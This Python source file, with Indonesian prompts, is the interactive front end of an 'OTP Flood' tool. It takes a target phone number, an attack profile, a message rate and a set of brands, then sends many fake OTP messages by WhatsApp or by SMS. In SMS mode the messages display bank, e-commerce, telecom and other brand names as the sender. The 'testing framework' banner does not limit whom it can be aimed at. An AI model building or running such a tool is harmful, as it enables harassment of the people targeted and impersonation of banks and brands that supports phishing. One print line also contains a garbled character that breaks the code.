"""
OTP Flood - Terminal UI
Mode: WA (QR scan) atau SMS (Alpha Sender ID — tampil sebagai brand)
"""

import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from modules.otp_flood.profiles import PROFILES
from modules.otp_flood.templates import CATEGORIES
from modules.otp_flood.engine import run_flood


class C:
    RST = "\033[0m"
    B = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YLW = "\033[93m"
    CYN = "\033[96m"
    WHT = "\033[97m"
    MAG = "\033[35m"


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def print_header():
    cls()
    print(f"\n{C.B}{C.RED}  ╔══════════════════════════════════════════════════╗{C.RST}")
    print(f"{C.B}{C.RED}  ║         OTP FLOOD TESTING FRAMEWORK              ║{C.RST}")
    print(f"{C.B}{C.RED}  ╚══════════════════════════════════════════════════╝{C.RST}")
    print(f"{C.DIM}  SMS Alpha Sender / WhatsApp Multi-Brand{C.RST}")
    print(f"{C.DIM}  ==================================================={C.RST}\n")


def select_mode():
    """Pilih mode pengiriman: SMS (brand) atau WhatsApp (nomor lo)"""
    print(f"  {C.B}Pilih mode pengiriman:{C.RST}\n")
    print(f"  {C.CYN}[1]{C.RST} {C.B}SMS — Alpha Sender ID{𝐶.RST}")
    print(f"  {C.DIM}     ✅ Muncul sebagai nama BRAND di HP target{C.RST}")
    print(f"  {C.DIM}     ✅ Gak perlu QR scan, gak perlu WA{C.RST}")
    print(f"  {C.DIM}     ⚠️  Perlu API key SMS Gateway (isi nanti){C.RST}\n")
    print(f"  {C.CYN}[2]{C.RST} {C.B}WhatsApp — Baileys (QR Scan){C.RST}")
    print(f"  {C.DIM}     ⚠️  Nomor lo kelihatan sebagai pengirim{C.RST}")
    print(f"  {C.DIM}     ⚠️  Perlu QR scan sekali{C.RST}\n")

    while True:
        print(f"  {C.CYN}Pilih (1/2): {C.RST}", end="")
        ch = input().strip()
        if ch == "1":
            # Check if SMS API is configured
            from modules.otp_flood.sender_sms import SMSSender
            test = SMSSender("0")
            if not test.api_url:
                print(f"\n  {C.YLW}🔧 SMS Gateway belum dikonfigurasi.{C.RST}")
                print(f"  {C.CYN}Silakan isi konfigurasi SMS:{C.RST}\n")
                configure_sms_api()
            return "sms"
        elif ch == "2":
            return "wa"
        print(f"  {C.RED}Pilih 1 atau 2.{C.RST}")


def configure_sms_api():
    """Prompt user to configure SMS API settings"""
    print(f"  {C.DIM}Contoh provider dengan Alpha Sender ID:{C.RST}")
    print(f"  {C.DIM}  • MedanPedia (mdpedia.com) — Indonesia, murah{C.RST}")
    print(f"  {C.DIM}  • Vonage/Nexmo — international, support alpha sender{C.RST}")
    print(f"  {C.DIM}  • Twilio — perlu messaging service config{C.RST}")
    print(f"  {C.DIM}  • API kustom — provider lo sendiri{C.RST}\n")

    val = input(f"  SMS API URL [default: https://mdpedia.com/api/sms.php]: ").strip()
    if val:
        os.environ["SMS_API_URL"] = val
    if not os.environ.get("SMS_API_URL"):
        os.environ["SMS_API_URL"] = "https://mdpedia.com/api/sms.php"

    val = input(f"  API Key / Token: ").strip()
    if val:
        os.environ["SMS_API_KEY"] = val

    val = input(f"  Username (jika perlu): ").strip()
    if val:
        os.environ["SMS_USERNAME"] = val

    print(f"\n  {C.GRN}✅ Konfigurasi tersimpan untuk sesi ini.{C.RST}")
    print(f"  {C.DIM}  Biar permanen, set environment variable di Windows:{C.RST}")
    print(f"  {C.DIM}  setx SMS_API_URL \"{os.environ.get('SMS_API_URL', '')}\"{C.RST}")
    print()


def input_target():
    while True:
        print(f"  Masukkan nomor HP target:")
        print(f"  {C.DIM}  (dengan kode negara, contoh: 6281234567890){C.RST}\n")
        print(f"  {C.CYN}Nomor target: {C.RST}", end="")
        val = input().strip()

        if val.lower() == "q":
            return None
        if not val.isdigit():
            print(f"  {C.RED}Hanya angka!{C.RST}\n")
            continue
        if len(val) < 10:
            print(f"  {C.RED}Minimal 10 digit.{C.RST}\n")
            continue

        print(f"  {C.GRN}✓ Target: {val}{C.RST}\n")
        return val


def select_profile():
    print(f"  {C.B}Pilih profile serangan:{C.RST}\n")
    keys = list(PROFILES.keys())
    for i, key in enumerate(keys, 1):
        p = PROFILES[key]
        print(f"  {C.CYN}[{i}]{C.RST} {C.B}{p['name']}{C.RST}")
        print(f"  {C.DIM}     {p['description']}{C.RST}\n")

    while True:
        print(f"  {C.CYN}Pilih (1-{len(keys)}): {C.RST}", end="")
        try:
            ch = input().strip()
            if ch.lower() == "q":
                return None
            idx = int(ch) - 1
            if 0 <= idx < len(keys):
                return keys[idx]
        except ValueError:
            pass
        print(f"  {C.RED}Pilihan tidak valid!{C.RST}")


def configure_params(profile_key):
    profile = PROFILES[profile_key]
    params = dict(profile["default_params"])

    print(f"\n  {C.B}Konfigurasi:{C.RST}\n")
    print(f"  {C.DIM}1-2 detik = kenceng, 3-5 = medium, 6-10 = slow{C.RST}\n")

    if "interval" in params:
        while True:
            val = input(f"  Interval antar pesan (dtk) [default: {params['interval']}]: ").strip()
            if not val:
                break
            try:
                params["interval"] = float(val)
                break
            except:
                print(f"  {C.RED}Angka!{C.RST}")

    while True:
        val = input(f"  Total maksimal pesan [default: 50]: ").strip()
        params["max_messages"] = int(val) if val else 50
        break

    while True:
        val = input(f"  Cooldown kalo gagal (dtk) [default: 30]: ").strip()
        params["block_cooldown"] = int(val) if val else 30
        break

    return params


def select_categories():
    print(f"\n  {C.B}Pilih brand:{C.RST}\n")
    keys = list(CATEGORIES.keys())
    labels = {
        "bank": "🏦 BANK",
        "e-commerce": "🛒 E-COMMERCE",
        "social-media": "📱 SOCIAL MEDIA",
        "streaming": "🎬 STREAMING",
        "telecom": "📡 TELECOM",
        "finance": "💰 FINANCE",
    }

    for i, key in enumerate(keys, 1):
        print(f"  {C.CYN}[{i}]{C.RST} {labels.get(key, key)} ({len(CATEGORIES[key])} brand)")

    print(f"\n  {C.CYN}[A]{C.RST} ALL — semua ({sum(len(v) for v in CATEGORIES.values())} brand)")
    print(f"  {C.CYN}[Q]{C.RST} Kembali\n")

    while True:
        print(f"  {C.CYN}Pilih (contoh: 1,3,5 atau A): {C.RST}", end="")
        ch = input().strip().upper()
        if ch == "Q":
            return None
        if ch == "A":
            return None
        try:
            indices = [int(x.strip()) - 1 for x in ch.split(",")]
            selected = [keys[i] for i in indices if 0 <= i < len(keys)]
            if selected:
                return selected
        except:
            pass
        print(f"  {C.RED}Tidak valid.{C.RST}")


def show_confirm(config):
    profile = PROFILES[config["profile"]]
    cats = config.get("categories")
    total_brands = (
        sum(len(CATEGORIES[c]) for c in cats) if cats
        else sum(len(v) for v in CATEGORIES.values())
    )

    interval = config.get("interval", 3)
    max_msgs = config.get("max_messages", 50)
    estimated = max(1, int((max_msgs * interval) / 60))
    
    mode_label = "SMS (Alpha Sender — tampil sebagai brand)" if config.get("mode") == "sms" else "WhatsApp (nomor lo kelihatan)"

    print(f"\n  {C.B}{C.CYN}  ╔═══════════════════════════════════════════╗{C.RST}")
    print(f"  {C.B}{C.CYN}  ║       KONFIRMASI                          ║{C.RST}")
    print(f"  {C.B}{C.CYN}  ╚═══════════════════════════════════════════╝{C.RST}\n")
    print(f"  {C.B}Mode     :{C.RST} {mode_label}")
    print(f"  {C.B}Target   :{C.RST} {config['target']}")
    print(f"  {C.B}Profile  :{C.RST} {profile['name']}")
    print(f"  {C.B}Interval :{C.RST} {interval}s")
    print(f"  {C.B}Max      :{C.RST} {max_msgs} pesan")
    print(f"  {C.B}Brand    :{C.RST} {total_brands} brand")
    print(f"  {C.B}Estimasi :{C.RST} ~{estimated} menit\n")

    while True:
        print(f"  {C.CYN}Mulai? (Y/n): {C.RST}", end="")
        ch = input().strip().lower()
        if ch in ("y", ""):
            return True
        elif ch == "n":
            return False
        print(f"  {C.RED}Y/n.{C.RST}")


def execute_flood(config):
    print(f"\n  {C.B}{C.CYN}  ╔═══════════════════════════════════════════╗{C.RST}")
    print(f"  {C.B}{C.CYN}  ║       OTP FLOOD - RUNNING                  ║{C.RST}")
    print(f"  {C.B}{C.CYN}  ╚═══════════════════════════════════════════╝{C.RST}\n")

    for output in run_flood(config):
        sys.stdout.write(output)
        sys.stdout.flush()


def otp_flood_menu():
    print_header()

    mode = select_mode()

    print_header()
    target = input_target()
    if target is None:
        return

    print_header()
    profile = select_profile()
    if profile is None:
        return

    print_header()
    params = configure_params(profile)

    print_header()
    categories = select_categories()

    config = {
        "mode": mode,
        "target": target,
        "profile": profile,
        **params,
        "categories": categories,
    }

    print_header()
    if not show_confirm(config):
        print(f"\n  {C.YLW}Dibatalkan.{C.RST}\n")
        return

    execute_flood(config)

    print(f"\n  {C.CYN}[1]{C.RST} Ulangi")
    print(f"  {C.CYN}[2]{C.RST} Menu utama")
    print(f"  {C.CYN}[3]{C.RST} Keluar\n")

    while True:
        print(f"  {C.CYN}Pilih: {C.RST}", end="")
        ch = input().strip()
        if ch == "1":
            return otp_flood_menu()
        elif ch == "2":
            return
        elif ch == "3":
            sys.exit(0)
        print(f"  {C.RED}Tidak valid.{C.RST}")
